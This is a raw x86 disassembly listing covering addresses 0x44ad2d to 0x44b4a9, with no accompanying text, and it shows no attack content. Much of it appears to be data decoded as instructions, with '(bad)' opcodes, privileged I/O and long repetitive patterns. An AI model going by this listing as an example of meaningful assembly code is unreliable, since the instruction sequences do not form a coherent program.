  44ad2d:	test   edi,esi
  44ad2f:	jecxz  0x44ad70
  44ad31:	sbb    BYTE PTR [ecx+0x63dad714],ch
  44ad37:	and    ecx,DWORD PTR [edx]
  44ad39:	pop    esi
  44ad3a:	push   edx
  44ad3b:	out    0x3f,eax
  44ad3d:	rep outs dx,DWORD PTR ds:[esi]
  44ad3f:	and    eax,0x9838e6df
  44ad44:	outs   dx,BYTE PTR ds:[esi]
  44ad45:	jmp    0x44ad79
  44ad47:	cli    
  44ad48:	aas    
  44ad49:	mov    edx,0x906532c2
  44ad4e:	sbb    BYTE PTR [edi+0x17],al
  44ad51:	push   ds
  44ad52:	(bad)  
  44ad53:	fnstsw WORD PTR [edi]
  44ad55:	add    BYTE PTR [eax],al
  44ad57:	add    BYTE PTR [eax],al
  44ad59:	add    BYTE PTR [eax+0xc230c49],dl
  44ad5f:	fincstp 
  44ad61:	ds sub al,0x5f
  44ad64:	mov    ah,0xe6
  44ad66:	xchg   edi,eax
  44ad67:	fnstenv [esi+ebp*4-0x2540ac7]
  44ad6e:	add    al,0x89
  44ad70:	xchg   esi,eax
  44ad71:	jmp    0x44adf2
  44ad73:	ins    BYTE PTR es:[edi],dx
  44ad74:	push   DWORD PTR [ebx-0x328a2cae]
  44ad7a:	add    al,0xe9
  44ad7c:	and    al,0xdf
  44ad7e:	addr16 pop ebx
  44ad80:	ds cmc 
  44ad82:	into   
  44ad83:	mov    edx,0x5d1f1196
  44ad88:	mov    ah,bl
  44ad8a:	iret   
  44ad8b:	js     0x44ad35
  44ad8d:	pop    edx
  44ad8e:	jno    0x44ad3e
  44ad90:	push   esi
  44ad91:	mov    dh,0x24
  44ad93:	push   cs
  44ad94:	jne    0x44ad5f
  44ad96:	mov    bh,0xb
  44ad98:	push   edi
  44ad99:	push   ebx
  44ad9a:	stos   DWORD PTR es:[edi],eax
  44ad9b:	outs   dx,BYTE PTR ds:[esi]
  44ad9c:	rol    ah,1
  44ad9e:	jl     0x44addf
  44ada0:	jns    0x44ad49
  44ada2:	lahf   
  44ada3:	xlat   BYTE PTR ds:[ebx]
  44ada4:	repz mov ecx,0xa4d5b1fc
  44adaa:	scas   al,BYTE PTR es:[edi]
  44adab:	or     cl,BYTE PTR [esp+ecx*4-0x79]
  44adaf:	mov    ch,0x2f
  44adb1:	mov    esi,0x3b991532
  44adb6:	cmp    DWORD PTR [edx],0x3a6f7a69
  44adbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44adbd:	pop    eax
  44adbe:	add    BYTE PTR [eax],al
  44adc0:	add    BYTE PTR [eax],al
  44adc2:	add    BYTE PTR [ecx+0x3f],dl
  44adc5:	adc    DWORD PTR [ebx-0x64],0x6b
  44adc9:	cdq    
  44adca:	push   edi
  44adcb:	push   edi
  44adcc:	test   al,0x6c
  44adce:	daa    
  44adcf:	sbb    eax,0xd927e9f
  44add4:	pop    cx
  44add6:	cmp    al,0xbf
  44add8:	mov    dl,0x19
  44adda:	adc    edx,DWORD PTR ds:0x8fa92f99
  44ade0:	pushf  
  44ade1:	inc    ecx
  44ade2:	pushf  
  44ade3:	mov    edx,0x31a05acf
  44ade8:	xchg   esi,eax
  44ade9:	xchg   edx,eax
  44adea:	out    0x63,eax
  44adec:	clc    
  44aded:	test   DWORD PTR [eax],esi
  44adef:	pop    ebp
  44adf0:	rcl    BYTE PTR [edi+ecx*8-0x3b],1
  44adf4:	jp     0x44ae0b
  44adf6:	mov    eax,0x74b1332e
  44adfb:	adc    ebp,ecx
  44adfd:	dec    bp
  44adff:	push   0xffffffa9
  44ae01:	sti    
  44ae02:	out    0x84,al
  44ae04:	xrelease mov BYTE PTR [ebx-0xc],0xcd
  44ae09:	(bad)  
  44ae0a:	jl     0x44adcd
  44ae0c:	leave  
  44ae0d:	jae    0x44add9
  44ae0f:	push   ds
  44ae10:	dec    ebx
  44ae11:	not    BYTE PTR [eax+0x57]
  44ae14:	retf   0x7b99
  44ae17:	fdivr  DWORD PTR [edx-0x6d976af4]
  44ae1d:	jo     0x44adc8
  44ae1f:	xchg   ebx,eax
  44ae20:	leave  
  44ae21:	aaa    
  44ae22:	xchg   DWORD PTR [ebp+0x99f0f0],esp
  44ae28:	add    BYTE PTR [eax],al
  44ae2a:	add    BYTE PTR [eax],al
  44ae2c:	stc    
  44ae2d:	pop    es
  44ae2e:	jmp    0xe50d5c61
  44ae33:	aam    0xa3
  44ae35:	pusha  
  44ae36:	adc    eax,0xaf9c822f
  44ae3b:	jae    0x44ae17
  44ae3d:	retf   
  44ae3e:	push   edi
  44ae3f:	mov    bh,dh
  44ae41:	jb     0x44ade4
  44ae43:	sub    eax,0xa558310d
  44ae48:	cmc    
  44ae49:	rcl    BYTE PTR [ebx],0xdb
  44ae4c:	loope  0x44adf1
  44ae4e:	pop    eax
  44ae4f:	mov    ch,0xfe
  44ae51:	imul   BYTE PTR [esi+0xedea09a]
  44ae57:	int3   
  44ae58:	inc    esp
  44ae59:	push   0x3a
  44ae5b:	mov    bh,0xa7
  44ae5d:	cmc    
  44ae5e:	cmp    edx,DWORD PTR [edi+0x6e321952]
  44ae64:	cmp    ecx,DWORD PTR [edx+0x70a2a9ac]
  44ae6a:	push   0xffffffd2
  44ae6c:	cmp    al,0x4c
  44ae6e:	or     DWORD PTR [edi+0x69],esp
  44ae71:	cmp    al,BYTE PTR [ebp+0x16]
  44ae74:	inc    ebx
  44ae75:	(bad)  
  44ae76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ae77:	sbb    DWORD PTR ds:0xfd1f06d1,ecx
  44ae7d:	out    dx,al
  44ae7e:	ins    BYTE PTR es:[edi],dx
  44ae7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae80:	or     eax,0x27e7b836
  44ae85:	pop    es
  44ae86:	dec    BYTE PTR [edi+eax*4+0x669f8864]
  44ae8d:	jp     0x44aea2
  44ae8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae90:	add    BYTE PTR [eax],al
  44ae92:	add    BYTE PTR [eax],al
  44ae94:	add    dl,ch
  44ae96:	push   0x15
  44ae98:	jmp    0x4d536130
  44ae9d:	sub    ebx,esi
  44ae9f:	push   cs
  44aea0:	dec    esi
  44aea1:	sbb    ebx,esi
  44aea3:	push   cs
  44aea4:	jmp    0xc853613c
  44aea9:	sub    edx,esi
  44aeab:	push   cs
  44aeac:	jmp    0xe9536144
  44aeb1:	xchg   ebx,eax
  44aeb2:	mov    dl,0xe
  44aeb4:	jmp    0x7953614c
  44aeb9:	or     dh,dl
  44aebb:	push   cs
  44aebc:	jmp    0xe9536154
  44aec1:	xchg   ebx,eax
  44aec2:	mov    dl,0xe
  44aec4:	jmp    0x2f53615c
  44aec9:	jmp    0xeb2:0x93e90ef1
  44aed0:	jmp    0x536168
  44aed5:	sub    DWORD PTR [ecx+0x49e5000e],esi
  44aedb:	dec    edi
  44aedc:	add    cl,bh
  44aede:	mov    al,0xe
  44aee0:	add    cl,ch
  44aee2:	mov    al,0xe
  44aee4:	add    cl,ch
  44aee6:	mov    al,0xe
  44aee8:	add    BYTE PTR [ebx+0x4b],dl
  44aeeb:	dec    edi
  44aeec:	add    cl,bh
  44aeee:	mov    al,0xe
  44aef0:	add    cl,ch
  44aef2:	mov    al,0xe
  44aef4:	add    cl,ch
  44aef6:	mov    al,0xe
  44aef8:	add    BYTE PTR [eax],al
  44aefa:	add    BYTE PTR [eax],al
  44aefc:	add    BYTE PTR [eax],al
  44aefe:	sbb    DWORD PTR [edx+0x4f],ecx
  44af01:	add    BYTE PTR [ecx-0x56fff150],bh
  44af07:	mov    al,0xe
  44af09:	add    BYTE PTR [ecx+0x17000eb0],ch
  44af0f:	dec    edx
  44af10:	dec    edi
  44af11:	add    BYTE PTR [ecx-0x56fff150],bh
  44af17:	mov    al,0xe
  44af19:	add    BYTE PTR [ecx+0x5e000eb0],ch
  44af1f:	pop    eax
  44af20:	dec    edi
  44af21:	add    BYTE PTR [ecx-0x50],bh
  44af24:	push   cs
  44af25:	add    BYTE PTR [ecx-0x50],ch
  44af28:	push   cs
  44af29:	add    BYTE PTR [ecx-0x50],ch
  44af2c:	push   cs
  44af2d:	add    BYTE PTR [ecx+0x58],dh
  44af30:	dec    edi
  44af31:	add    BYTE PTR [ecx-0x50],bh
  44af34:	push   cs
  44af35:	add    BYTE PTR [ecx-0x50],ch
  44af38:	push   cs
  44af39:	add    BYTE PTR [ecx-0x50],ch
  44af3c:	push   cs
  44af3d:	add    bh,cl
  44af3f:	push   edi
  44af40:	dec    edi
  44af41:	add    BYTE PTR [ecx],bh
  44af43:	mov    al,0xe
  44af45:	add    BYTE PTR [ecx],ch
  44af47:	mov    al,0xe
  44af49:	add    BYTE PTR [ecx],ch
  44af4b:	mov    al,0xe
  44af4d:	add    BYTE PTR ds:0x90004f59,dh
  44af53:	cdq    
  44af54:	or     al,0x0
  44af56:	nop
  44af57:	cdq    
  44af58:	or     al,0x0
  44af5a:	nop
  44af5b:	cdq    
  44af5c:	or     al,0x0
  44af5e:	nop
  44af5f:	pop    esi
  44af60:	mov    ch,0x40
  44af62:	add    BYTE PTR [eax],al
  44af64:	add    BYTE PTR [eax],al
  44af66:	add    BYTE PTR [eax-0x6ffff367],dl
  44af6c:	cdq    
  44af6d:	or     al,0x0
  44af6f:	nop
  44af70:	cdq    
  44af71:	or     al,0x0
  44af73:	nop
  44af74:	dec    edx
  44af75:	mov    edx,0xc999040
  44af7a:	add    BYTE PTR [eax-0x6ffff367],dl
  44af80:	cdq    
  44af81:	or     al,0x0
  44af83:	nop
  44af84:	imul   esi,DWORD PTR [esi+0xc999040],0x0
  44af8b:	nop
  44af8c:	cdq    
  44af8d:	or     al,0x0
  44af8f:	nop
  44af90:	cdq    
  44af91:	or     al,0x0
  44af93:	nop
  44af94:	mov    al,ds:0x999040b4
  44af99:	or     al,0x0
  44af9b:	nop
  44af9c:	cdq    
  44af9d:	or     al,0x0
  44af9f:	nop
  44afa0:	cdq    
  44afa1:	or     al,0x0
  44afa3:	nop
  44afa4:	into   
  44afa5:	mov    ah,0x40
  44afa7:	nop
  44afa8:	cdq    
  44afa9:	or     al,0x0
  44afab:	nop
  44afac:	cdq    
  44afad:	or     al,0x0
  44afaf:	nop
  44afb0:	cdq    
  44afb1:	or     al,0x0
  44afb3:	nop
  44afb4:	je     0x44aff1
  44afb6:	inc    ecx
  44afb7:	nop
  44afb8:	cdq    
  44afb9:	or     al,0x0
  44afbb:	nop
  44afbc:	cdq    
  44afbd:	or     al,0x0
  44afbf:	nop
  44afc0:	cdq    
  44afc1:	or     al,0x0
  44afc3:	nop
  44afc4:	scas   al,BYTE PTR es:[edi]
  44afc5:	cmp    DWORD PTR [ecx-0x70],eax
  44afc8:	cdq    
  44afc9:	or     al,0x0
  44afcb:	add    BYTE PTR [eax],al
  44afcd:	add    BYTE PTR [eax],al
  44afcf:	add    BYTE PTR [eax-0x6ffff367],dl
  44afd5:	mov    dl,0xf5
  44afd7:	add    edx,DWORD PTR [eax-0x2ed6154e]
  44afdd:	mov    dl,0xf5
  44afdf:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44afe5:	mov    dl,0xf5
  44afe7:	add    edx,DWORD PTR [eax+0x51298db2]
  44afed:	mov    dl,0xf5
  44afef:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44aff5:	mov    dl,0xf5
  44aff7:	add    edx,DWORD PTR [eax+0x512980b2]
  44affd:	mov    dl,0xf5
  44afff:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b005:	mov    dl,0xf5
  44b007:	add    edx,DWORD PTR [eax+0x51299fb2]
  44b00d:	mov    dl,0xf5
  44b00f:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b015:	mov    dl,0xf5
  44b017:	add    edx,DWORD PTR [eax+0x512abfb2]
  44b01d:	mov    dl,0xf5
  44b01f:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b025:	mov    dl,0xf5
  44b027:	add    edx,DWORD PTR [eax-0x2ed5644e]
  44b02d:	mov    dl,0xf5
  44b02f:	add    edx,DWORD PTR [eax+0x3f5b2]
  44b035:	add    BYTE PTR [eax],al
  44b037:	add    BYTE PTR [eax],al
  44b039:	nop
  44b03a:	mov    dl,0xf5
  44b03c:	add    edx,DWORD PTR [eax-0x2d30df4e]
  44b042:	mov    dl,0xf5
  44b044:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b04a:	mov    dl,0xf5
  44b04c:	add    edx,DWORD PTR [eax-0x2d2f214e]
  44b052:	mov    dl,0xe
  44b054:	jmp    0xe95362ec
  44b059:	xchg   ebx,eax
  44b05a:	mov    dl,0xe
  44b05c:	jmp    0xaf5362f4
  44b061:	inc    eax
  44b062:	cmc    
  44b063:	push   cs
  44b064:	jmp    0xe95362fc
  44b069:	xchg   ebx,eax
  44b06a:	mov    dl,0xe
  44b06c:	jmp    0x72536304
  44b071:	loopne 0x44b067
  44b073:	push   cs
  44b074:	jmp    0xe953630c
  44b079:	xchg   ebx,eax
  44b07a:	mov    dl,0xe
  44b07c:	jmp    0xd2536314
  44b081:	xlat   BYTE PTR ds:[ebx]
  44b082:	hlt    
  44b083:	push   cs
  44b084:	jmp    0xe953631c
  44b089:	xchg   ebx,eax
  44b08a:	mov    dl,0xe
  44b08c:	jmp    0xf6536324
  44b091:	aad    0xf4
  44b093:	push   cs
  44b094:	jmp    0xe953632c
  44b099:	xchg   ebx,eax
  44b09a:	mov    dl,0xe
  44b09c:	jmp    0x44b0a1
  44b0a1:	add    BYTE PTR [ebx-0x2947f14e],dl
  44b0a7:	hlt    
  44b0a8:	push   cs
  44b0a9:	jmp    0xe9536341
  44b0ae:	xchg   ebx,eax
  44b0af:	mov    dl,0xe
  44b0b1:	jmp    0x83536349
  44b0b6:	push   esi
  44b0b7:	hlt    
  44b0b8:	push   cs
  44b0b9:	jmp    0xe9536351
  44b0be:	xchg   ebx,eax
  44b0bf:	mov    dl,0xe
  44b0c1:	jmp    0xa536359
  44b0c6:	push   ebp
  44b0c7:	hlt    
  44b0c8:	push   cs
  44b0c9:	jmp    0xe9536361
  44b0ce:	xchg   ebx,eax
  44b0cf:	mov    dl,0xe
  44b0d1:	add    BYTE PTR [ecx],bh
  44b0d3:	mov    ch,0xe
  44b0d5:	add    dh,dh
  44b0d7:	jne    0x44b126
  44b0d9:	add    BYTE PTR [ecx],ch
  44b0db:	mov    ch,0xe
  44b0dd:	add    BYTE PTR [ecx],ch
  44b0df:	mov    ch,0xe
  44b0e1:	add    BYTE PTR [ecx],bh
  44b0e3:	mov    ch,0xe
  44b0e5:	add    BYTE PTR [eax],cl
  44b0e7:	call   0xb56db13a
  44b0ec:	push   cs
  44b0ed:	add    BYTE PTR [ecx],ch
  44b0ef:	mov    ch,0xe
  44b0f1:	add    cl,bh
  44b0f3:	mov    ah,0xe
  44b0f5:	add    BYTE PTR [eax+ebp*8-0x4b16ffb2],ah
  44b0fc:	push   cs
  44b0fd:	add    cl,ch
  44b0ff:	mov    ah,0xe
  44b101:	add    cl,bh
  44b103:	mov    ah,0xe
  44b105:	add    BYTE PTR [eax],al
  44b107:	add    BYTE PTR [eax],al
  44b109:	add    BYTE PTR [eax],al
  44b10b:	fimul  WORD PTR [edx+0x4e]
  44b10e:	add    cl,ch
  44b110:	mov    ah,0xe
  44b112:	add    cl,ch
  44b114:	mov    ah,0xe
  44b116:	add    BYTE PTR [ecx+0x32],dh
  44b119:	dec    edi
  44b11a:	add    BYTE PTR [ecx+0x32],bl
  44b11d:	dec    edi
  44b11e:	add    BYTE PTR [ebp+0x32],cl
  44b121:	dec    edi
  44b122:	add    BYTE PTR [ebp+0x32],dh
  44b125:	dec    edi
  44b126:	add    BYTE PTR [ebp+0x71004f32],cl
  44b12c:	xor    cl,BYTE PTR [edi+0x0]
  44b12f:	sub    DWORD PTR [ecx],ecx
  44b131:	dec    edi
  44b132:	add    BYTE PTR [ecx],dh
  44b134:	or     DWORD PTR [edi+0x0],ecx
  44b137:	jmp    0xf1450043
  44b13c:	pop    es
  44b13d:	dec    edi
  44b13e:	add    cl,cl
  44b140:	pop    es
  44b141:	dec    edi
  44b142:	add    cl,dl
  44b144:	pop    es
  44b145:	dec    edi
  44b146:	add    BYTE PTR [ecx],cl
  44b148:	or     BYTE PTR [edi+0x0],cl
  44b14b:	add    eax,0x90004f08
  44b150:	shl    DWORD PTR [edi+0x40],1
  44b153:	nop
  44b154:	leave  
  44b155:	addr16 inc eax
  44b157:	nop
  44b158:	shl    DWORD PTR [edi+0x40],1
  44b15b:	nop
  44b15c:	stc    
  44b15d:	addr16 inc eax
  44b15f:	nop
  44b160:	in     eax,dx
  44b161:	addr16 inc eax
  44b163:	nop
  44b164:	shl    DWORD PTR [edi+0x40],0x90
  44b168:	cdq    
  44b169:	imul   eax,DWORD PTR [eax-0x70],0x406995
  44b170:	add    BYTE PTR [eax],al
  44b172:	add    BYTE PTR [eax],al
  44b174:	nop
  44b175:	test   DWORD PTR [ecx+0x40],ebp
  44b178:	nop
  44b179:	jns    0x44b1e4
  44b17b:	inc    eax
  44b17c:	nop
  44b17d:	pop    ebp
  44b17e:	imul   eax,DWORD PTR [eax-0x70],0x9040693d
  44b185:	cdq    
  44b186:	or     al,0x0
  44b188:	nop
  44b189:	mov    eax,0x209087b
  44b18e:	fs inc eax
  44b190:	nop
  44b191:	adc    eax,0x9904064
  44b196:	fs inc eax
  44b198:	nop
  44b199:	std    
  44b19a:	arpl   WORD PTR [eax-0x70],ax
  44b19d:	adc    DWORD PTR [eax+eax*2-0x70],esp
  44b1a1:	in     eax,0x63
  44b1a3:	inc    eax
  44b1a4:	nop
  44b1a5:	cmp    DWORD PTR [eax+eax*2-0x70],esp
  44b1a9:	sub    eax,0xe1904064
  44b1ae:	arpl   WORD PTR [eax-0x70],ax
  44b1b1:	cmc    
  44b1b2:	arpl   WORD PTR [eax-0x70],ax
  44b1b5:	jmp    0xddd4f21d
  44b1ba:	arpl   WORD PTR [eax-0x70],ax
  44b1bd:	dec    ecx
  44b1be:	lods   eax,DWORD PTR ds:[esi]
  44b1bf:	inc    eax
  44b1c0:	nop
  44b1c1:	cdq    
  44b1c2:	or     al,0x0
  44b1c4:	nop
  44b1c5:	cdq    
  44b1c6:	or     al,0x0
  44b1c8:	nop
  44b1c9:	cdq    
  44b1ca:	or     al,0x0
  44b1cc:	nop
  44b1cd:	mov    dl,0xf5
  44b1cf:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b1d5:	mov    dl,0xf5
  44b1d7:	add    eax,DWORD PTR [eax]
  44b1d9:	add    BYTE PTR [eax],al
  44b1db:	add    BYTE PTR [eax],al
  44b1dd:	nop
  44b1de:	mov    dl,0xf5
  44b1e0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b1e6:	mov    dl,0xf5
  44b1e8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b1ee:	mov    dl,0xf5
  44b1f0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b1f6:	mov    dl,0xf5
  44b1f8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b1fe:	mov    dl,0xf5
  44b200:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b206:	mov    dl,0xf5
  44b208:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b20e:	mov    dl,0xf5
  44b210:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b216:	mov    dl,0xf5
  44b218:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b21e:	mov    dl,0xf5
  44b220:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b226:	mov    dl,0xf5
  44b228:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b22e:	mov    dl,0xf5
  44b230:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b236:	mov    dl,0xf5
  44b238:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b23e:	mov    dl,0xf5
  44b240:	add    eax,DWORD PTR [eax]
  44b242:	add    BYTE PTR [eax],al
  44b244:	add    BYTE PTR [eax],al
  44b246:	nop
  44b247:	mov    dl,0xf5
  44b249:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44b24f:	mov    dl,0xe
  44b251:	jmp    0xe95364e9
  44b256:	xchg   ebx,eax
  44b257:	mov    dl,0xe
  44b259:	jmp    0xe95364f1
  44b25e:	xchg   ebx,eax
  44b25f:	mov    dl,0xe
  44b261:	jmp    0xe95364f9
  44b266:	xchg   ebx,eax
  44b267:	mov    dl,0xe
  44b269:	jmp    0xe9536501
  44b26e:	xchg   ebx,eax
  44b26f:	mov    dl,0xe
  44b271:	jmp    0xe9536509
  44b276:	xchg   ebx,eax
  44b277:	mov    dl,0xe
  44b279:	jmp    0xe9536511
  44b27e:	xchg   ebx,eax
  44b27f:	mov    dl,0xe
  44b281:	jmp    0xe9536519
  44b286:	xchg   ebx,eax
  44b287:	mov    dl,0xe
  44b289:	jmp    0xe9536521
  44b28e:	xchg   ebx,eax
  44b28f:	mov    dl,0xe
  44b291:	jmp    0xe9536529
  44b296:	xchg   ebx,eax
  44b297:	mov    dl,0xe
  44b299:	jmp    0xe9536531
  44b29e:	xchg   ebx,eax
  44b29f:	mov    dl,0xe
  44b2a1:	jmp    0xe9536539
  44b2a6:	xchg   ebx,eax
  44b2a7:	mov    dl,0xe
  44b2a9:	jmp    0x44b2ae
  44b2ae:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44b2b4:	mov    dl,0xe
  44b2b6:	jmp    0xe953654e
  44b2bb:	xchg   ebx,eax
  44b2bc:	mov    dl,0xe
  44b2be:	jmp    0xe9536556
  44b2c3:	xchg   ebx,eax
  44b2c4:	mov    dl,0xe
  44b2c6:	jmp    0xe953655e
  44b2cb:	xchg   ebx,eax
  44b2cc:	mov    dl,0xe
  44b2ce:	add    BYTE PTR [ecx-0x4f],bh
  44b2d1:	push   cs
  44b2d2:	add    BYTE PTR [ecx-0x4f],ch
  44b2d5:	push   cs
  44b2d6:	add    BYTE PTR [ecx-0x4f],ch
  44b2d9:	push   cs
  44b2da:	add    BYTE PTR [ecx-0x4f],bh
  44b2dd:	push   cs
  44b2de:	add    BYTE PTR [ecx-0x4f],bh
  44b2e1:	push   cs
  44b2e2:	add    BYTE PTR [ecx-0x4f],ch
  44b2e5:	push   cs
  44b2e6:	add    BYTE PTR [ecx-0x4f],ch
  44b2e9:	push   cs
  44b2ea:	add    BYTE PTR [ecx],bh
  44b2ec:	mov    cl,0xe
  44b2ee:	add    BYTE PTR [ecx],bh
  44b2f0:	mov    cl,0xe
  44b2f2:	add    BYTE PTR [ecx],ch
  44b2f4:	mov    cl,0xe
  44b2f6:	add    BYTE PTR [ecx],ch
  44b2f8:	mov    cl,0xe
  44b2fa:	add    BYTE PTR [ecx],bh
  44b2fc:	mov    cl,0xe
  44b2fe:	add    BYTE PTR [ecx],bh
  44b300:	mov    cl,0xe
  44b302:	add    BYTE PTR [ecx],ch
  44b304:	mov    cl,0xe
  44b306:	add    BYTE PTR [ecx],ch
  44b308:	mov    cl,0xe
  44b30a:	add    cl,bh
  44b30c:	mov    al,0xe
  44b30e:	add    cl,bh
  44b310:	mov    al,0xe
  44b312:	add    BYTE PTR [eax],al
  44b314:	add    BYTE PTR [eax],al
  44b316:	add    BYTE PTR [eax],al
  44b318:	jmp    0xe944c1cd
  44b31d:	mov    al,0xe
  44b31f:	add    cl,bh
  44b321:	mov    al,0xe
  44b323:	add    cl,bh
  44b325:	mov    al,0xe
  44b327:	add    cl,ch
  44b329:	mov    al,0xe
  44b32b:	add    cl,ch
  44b32d:	mov    al,0xe
  44b32f:	add    BYTE PTR [ecx-0x46fff150],bh
  44b335:	mov    al,0xe
  44b337:	add    BYTE PTR [ecx-0x56fff150],ch
  44b33d:	mov    al,0xe
  44b33f:	add    BYTE PTR [ecx-0x46fff150],bh
  44b345:	mov    al,0xe
  44b347:	add    BYTE PTR [ecx-0x6ffff150],ch
  44b34d:	fwait
  44b34e:	or     al,0x0
  44b350:	nop
  44b351:	cdq    
  44b352:	or     al,0x0
  44b354:	nop
  44b355:	cdq    
  44b356:	or     al,0x0
  44b358:	nop
  44b359:	cdq    
  44b35a:	or     al,0x0
  44b35c:	nop
  44b35d:	cdq    
  44b35e:	or     al,0x0
  44b360:	nop
  44b361:	cdq    
  44b362:	or     al,0x0
  44b364:	nop
  44b365:	cdq    
  44b366:	or     al,0x0
  44b368:	nop
  44b369:	cdq    
  44b36a:	or     al,0x0
  44b36c:	nop
  44b36d:	cdq    
  44b36e:	or     al,0x0
  44b370:	nop
  44b371:	cdq    
  44b372:	or     al,0x0
  44b374:	nop
  44b375:	cdq    
  44b376:	or     al,0x0
  44b378:	nop
  44b379:	cdq    
  44b37a:	or     al,0x0
  44b37c:	add    BYTE PTR [eax],al
  44b37e:	add    BYTE PTR [eax],al
  44b380:	add    BYTE PTR [eax-0x6ffff367],dl
  44b386:	cdq    
  44b387:	or     al,0x0
  44b389:	nop
  44b38a:	cdq    
  44b38b:	or     al,0x0
  44b38d:	nop
  44b38e:	cdq    
  44b38f:	or     al,0x0
  44b391:	nop
  44b392:	cdq    
  44b393:	fdiv   st(7),st
  44b395:	setbe  BYTE PTR [eax+eax*1]
  44b399:	nop
  44b39a:	icebp  
  44b39b:	adc    al,0xbc
  44b39d:	mov    ecx,0xb9d414a9
  44b3a2:	mov    cl,0x14
  44b3a4:	in     al,dx
  44b3a5:	test   eax,0xaa041a99
  44b3aa:	mov    cl,0x14
  44b3ac:	sbb    al,0x9a
  44b3ae:	cdq    
  44b3af:	int3   
  44b3b0:	call   edi
  44b3b2:	rcl    DWORD PTR [edx],1
  44b3b4:	add    BYTE PTR [eax-0x79b7ef33],dl
  44b3ba:	jne    0x44b3cd
  44b3bc:	call   0xf056293f
  44b3c1:	jbe    0x44b408
  44b3c3:	adc    eax,edi
  44b3c5:	outs   dx,BYTE PTR ds:[esi]
  44b3c6:	push   ebp
  44b3c7:	adc    DWORD PTR [eax],eax
  44b3c9:	addr16 mov dl,0x51
  44b3cc:	pop    es
  44b3cd:	xor    bl,al
  44b3cf:	adc    DWORD PTR [edi],eax
  44b3d1:	sub    bl,al
  44b3d3:	adc    DWORD PTR [edi],eax
  44b3d5:	add    ah,al
  44b3d7:	add    DWORD PTR [edi],eax
  44b3d9:	or     ah,al
  44b3db:	and    eax,0x4dc32c07
  44b3e0:	pop    es
  44b3e1:	cmp    al,0xc3
  44b3e3:	mov    ch,0x7
  44b3e5:	add    BYTE PTR [eax],al
  44b3e7:	add    BYTE PTR [eax],al
  44b3e9:	add    BYTE PTR [ebx+eax*8],ch
  44b3ec:	lods   eax,DWORD PTR ds:[esi]
  44b3ed:	pop    es
  44b3ee:	dec    esp
  44b3ef:	ret    
  44b3f0:	and    eax,0x4dc34c07
  44b3f5:	pop    es
  44b3f6:	cmp    al,0xc3
  44b3f8:	inc    ebp
  44b3f9:	pop    es
  44b3fa:	inc    esp
  44b3fb:	ret    
  44b3fc:	cmc    
  44b3fd:	mov    bl,0x47
  44b3ff:	add    esi,0x3
  44b402:	nop
  44b403:	mov    dl,0xdd
  44b405:	adc    eax,DWORD PTR [edx+eax*8-0x3d8bebeb]
  44b40c:	cmc    
  44b40d:	jecxz  0x44b436
  44b40f:	sub    DWORD PTR [esi],0x5
  44b412:	nop
  44b413:	mov    dl,0x1
  44b415:	adc    bl,BYTE PTR [eax+eax*8]
  44b418:	stc    
  44b419:	adc    dl,BYTE PTR [edi+edi*4-0x4063ed1f]
  44b420:	fst    DWORD PTR [edx]
  44b422:	mov    ah,0xbf
  44b424:	mov    eax,ds:0xb9bfbc12
  44b429:	adc    dl,BYTE PTR [edi+edi*4-0x7f]
  44b42d:	adc    bh,BYTE PTR [edi+edi*4]
  44b430:	pop    ecx
  44b431:	adc    esi,DWORD PTR [edi+edi*4+0x41]
  44b435:	adc    ebx,DWORD PTR [edi+edi*4+0x79]
  44b439:	adc    dl,BYTE PTR [edi+edi*4]
  44b43c:	popa   
  44b43d:	adc    bl,BYTE PTR [edi+edi*4]
  44b440:	cdq    
  44b441:	adc    dh,ah
  44b443:	mov    esi,0xbefc1261
  44b448:	push   cs
  44b449:	lods   eax,DWORD PTR ds:[esi]
  44b44a:	sub    BYTE PTR [esi+0x1c],0x95
  44b44e:	add    BYTE PTR [eax],al
  44b450:	add    BYTE PTR [eax],al
  44b452:	add    BYTE PTR [edx-0x7d72e3a2],al
  44b458:	mov    ds,WORD PTR [edx*4-0x12e3817e]
  44b45f:	lahf   
  44b460:	mov    dh,0x22
  44b462:	cmc    
  44b463:	xchg   edi,eax
  44b464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b465:	and    cl,ch
  44b467:	(bad)  
  44b468:	(bad)  
  44b469:	and    dh,BYTE PTR [ebp+0x2d22c687]
  44b46f:	xor    dh,0x22
  44b472:	adc    eax,0xcd22e680
  44b477:	(bad)  
  44b478:	push   ss
  44b479:	and    edx,ebp
  44b47b:	xchg   DWORD PTR [esi],eax
  44b47d:	and    ebp,DWORD PTR [ebp-0x61]
  44b480:	and    esi,DWORD PTR ss:[ebp-0x69]
  44b484:	and    ecx,DWORD PTR es:[ebp+0x7523568f]
  44b48b:	xchg   DWORD PTR [esi+0x23],eax
  44b48e:	sub    eax,0x1523769f
  44b493:	xchg   edi,eax
  44b494:	and    cx,WORD PTR ds:0x1523968f
  44b49b:	xchg   DWORD PTR [esi-0x495f12dd],eax
  44b4a1:	and    ebp,esi
  44b4a3:	mov    al,ds:0xa0cd21a6
  44b4a8:	(bad)  
  44b4a9:	and    DWORD PTR [ebp-0x52de3960],esi
